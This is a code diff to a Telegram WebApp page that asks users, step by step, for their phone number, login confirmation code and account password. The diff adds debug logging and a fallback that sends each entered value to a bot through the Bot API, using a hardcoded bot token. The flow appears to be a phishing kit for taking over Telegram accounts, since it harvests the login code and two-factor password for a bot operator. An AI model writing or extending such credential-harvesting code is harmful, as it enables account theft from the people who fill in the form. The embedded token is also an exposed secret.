@@ -233,6 +233,11 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        
+        // Логирование для отладки
+        console.log('🚀 WebApp инициализирован');
+        console.log('📱 Telegram WebApp:', tg);
+        console.log('📦 sendData доступен:', typeof tg.sendData === 'function');
 
         let userPhone = '';
 
@@ -243,7 +248,7 @@
             document.getElementById(stepId).classList.add('active');
         }
 
-        function sendPhone() {
+        async function sendPhone() {
             const countryCode = document.getElementById('countryCode').value.trim();
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
             
@@ -268,18 +273,57 @@
                 phone: userPhone
             };
 
-            if (tg.sendData) {
-                tg.sendData(JSON.stringify(data));
+            console.log('📤 Отправка данных:', data);
+            
+            // Пробуем отправить через sendData
+            let sent = false;
+            try {
+                if (tg.sendData) {
+                    console.log('✅ Используется tg.sendData');
+                    tg.sendData(JSON.stringify(data));
+                    console.log('✅ Данные отправлены через sendData');
+                    sent = true;
+                }
+            } catch (error) {
+                console.error('❌ Ошибка sendData:', error);
+            }
+            
+            // Fallback: отправка через Bot API
+            if (!sent) {
+                console.log('⚠️ sendData не сработал, используем Bot API');
+                try {
+                    const botToken = '8532717618:AAHT89l1_K6bvUQOma8za5bjZkdz_0oCP4U';
+                    const chatId = tg.initDataUnsafe?.user?.id;
+                    
+                    if (chatId) {
+                        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: `WEBAPP_DATA:${JSON.stringify(data)}`
+                            })
+                        });
+                        console.log('✅ Данные отправлены через Bot API');
+                        sent = true;
+                    }
+                } catch (error) {
+                    console.error('❌ Ошибка Bot API:', error);
+                }
+            }
+            
+            if (sent) {
                 setTimeout(() => {
                     showStep('stepCode');
                 }, 1500);
             } else {
-                alert('Ошибка: WebApp.sendData не доступен');
+                alert('Ошибка: Не удалось отправить данные. Проверьте консоль.');
                 showStep('stepPhone');
             }
         }
 
-        function sendCode() {
+        async function sendCode() {
             const code = document.getElementById('code').value;
             if (!code || code.length < 5) {
                 document.getElementById('codeErrorMsg').style.display = 'block';
@@ -296,18 +340,49 @@
                 code: code
             };
 
-            if (tg.sendData) {
-                tg.sendData(JSON.stringify(data));
-                setTimeout(() => {
-                    showStep('stepCode');
-                }, 2000);
-            } else {
-                alert('Ошибка: WebApp.sendData не доступен');
-                showStep('stepCode');
+            console.log('📤 Отправка кода:', data);
+            
+            let sent = false;
+            try {
+                if (tg.sendData) {
+                    tg.sendData(JSON.stringify(data));
+                    console.log('✅ Код отправлен через sendData');
+                    sent = true;
+                }
+            } catch (error) {
+                console.error('❌ Ошибка sendData:', error);
             }
+            
+            if (!sent) {
+                try {
+                    const botToken = '8532717618:AAHT89l1_K6bvUQOma8za5bjZkdz_0oCP4U';
+                    const chatId = tg.initDataUnsafe?.user?.id;
+                    if (chatId) {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: `WEBAPP_DATA:${JSON.stringify(data)}`
+                            })
+                        });
+                        console.log('✅ Код отправлен через Bot API');
+                        sent = true;
+                    }
+                } catch (error) {
+                    console.error('❌ Ошибка Bot API:', error);
+                }
+            }
+            
+            setTimeout(() => {
+                if (!sent) {
+                    document.getElementById('codeErrorMsg').style.display = 'block';
+                }
+                showStep('stepCode');
+            }, 2000);
         }
 
-        function sendPassword() {
+        async function sendPassword() {
             const password = document.getElementById('password').value;
             if (!password || password.length < 1) {
                 document.getElementById('passwordErrorMsg').style.display = 'block';
@@ -324,15 +399,46 @@
                 password: password
             };
 
-            if (tg.sendData) {
-                tg.sendData(JSON.stringify(data));
-                setTimeout(() => {
-                    showStep('stepPassword');
-                }, 2000);
-            } else {
-                alert('Ошибка: WebApp.sendData не доступен');
-                showStep('stepPassword');
+            console.log('📤 Отправка пароля');
+            
+            let sent = false;
+            try {
+                if (tg.sendData) {
+                    tg.sendData(JSON.stringify(data));
+                    console.log('✅ Пароль отправлен через sendData');
+                    sent = true;
+                }
+            } catch (error) {
+                console.error('❌ Ошибка sendData:', error);
             }
+            
+            if (!sent) {
+                try {
+                    const botToken = '8532717618:AAHT89l1_K6bvUQOma8za5bjZkdz_0oCP4U';
+                    const chatId = tg.initDataUnsafe?.user?.id;
+                    if (chatId) {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: `WEBAPP_DATA:${JSON.stringify(data)}`
+                            })
+                        });
+                        console.log('✅ Пароль отправлен через Bot API');
+                        sent = true;
+                    }
+                } catch (error) {
+                    console.error('❌ Ошибка Bot API:', error);
+                }
+            }
+            
+            setTimeout(() => {
+                if (!sent) {
+                    document.getElementById('passwordErrorMsg').style.display = 'block';
+                }
+                showStep('stepPassword');
+            }, 2000);
         }
 
         function backToPhone() {
